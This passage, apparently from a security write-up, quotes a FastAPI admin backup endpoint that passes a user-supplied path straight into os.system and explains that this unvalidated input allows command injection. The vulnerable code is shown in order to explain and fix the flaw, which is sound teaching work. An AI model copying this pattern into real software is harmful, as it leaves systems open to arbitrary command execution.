# Take a backup of the application
@router.post("/backup",dependencies=[Depends(is_logged), Depends(is_admin)],include_in_schema=False)
async def backup(payload: backup):
    os.system(f'tar -c -f {str(payload.path)}/app_backkup.tar {str(WORK_DIR)}')
    return {"INFO": "Done!"}
```

There was no validation of the 'path' variable. Using [subprocess](https://docs.python.org/3/library/subprocess.html#security-considerations) would have helped prevent command injection. But a better solution would have been to not use input from the user. Why allow them to write backups anywhere they want? 